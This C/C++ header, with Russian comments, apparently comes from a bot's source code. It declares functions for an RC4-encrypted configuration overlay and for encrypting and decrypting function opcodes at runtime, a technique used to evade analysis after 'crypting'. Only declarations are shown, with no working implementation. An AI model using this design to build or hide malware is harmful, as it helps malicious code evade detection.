/*
  Базовый оверлей для бота, и функции связаные с ним.
*/
#pragma once

namespace BaseOverlay
{  
  enum
  {
    MAGIC_DWORD          = 0x45564144, //Магическео чилсо (DAVE).
    FULL_SIZE_OF_OVERLAY = 512,        //Полный максимальный размер оверлея после крипта.
  };
  
  /*
    Инициализация.
  */
  void init(void);

  /*
    Деинициализация.
  */
  void uninit(void);

  /*
    Загрузка оверлея.

    OUT buffer         - буфер для данных оверлея. Должен быть размером не менее
                         FULL_SIZE_OF_OVERLAY.
    IN overlay         - адрес зашифрованого оверлея.
    IN OUT overlaySize - на входе - размер overlay. На вызходе - размер данных оверлея.
    IN rc4Key          - ключ шифрования. Может быть NULL.

    Return             - true - в случаи успеха,
                         false - в случаи ошибки.
  */
  bool _loadOverlay(void *buffer, const void *overlay, LPDWORD overlaySize, const Crypt::RC4KEY *rc4Key);
  
  /*
    Создание оверлея.

    OUT overlay - адрес по которому будет записан оверлей.
    IN data     - данные оверлея.
    IN dataSize - размер данных оверлея.
    IN rc4Key   - ключ шифрования. Может быть NULL.

    Return      - true - в случаи успеха,
                  false - в случаи ошибки.
  */
  bool _createOverlay(void *overlay, const void *data, WORD dataSize, const Crypt::RC4KEY *rc4Key);
  
  /*
    Получение адреса оверлея.

    IN mem    - данные, в которых будет произхводиться.
    IN size   - размер mem.
    IN rc4Key - ключ шифрования. Может быть NULL.
    
    Return    - адрес оверлея, или NULL - в случаи ошибки.
  */
  void *_getAddress(const void *mem, DWORD size, const Crypt::RC4KEY *rc4Key);

  /*
    Дешифрование опкодов функции.

    IN OUT curOpcode - первый криптованный опкод.
    IN size          - полное кол. криптованнызх байт.
    IN key           - ключ.
  */
  void _decryptFunction(LPBYTE curOpcode, DWORD size, DWORD key);

  /*
    Шифрование опкодов до первой встречи RET.

    IN OUT curOpcode - точка старта.
    IN key           - ключ.

    Return           - количество закриптованных байт.
  */
  DWORD _encryptFunction(LPBYTE curOpcode, DWORD key);
};
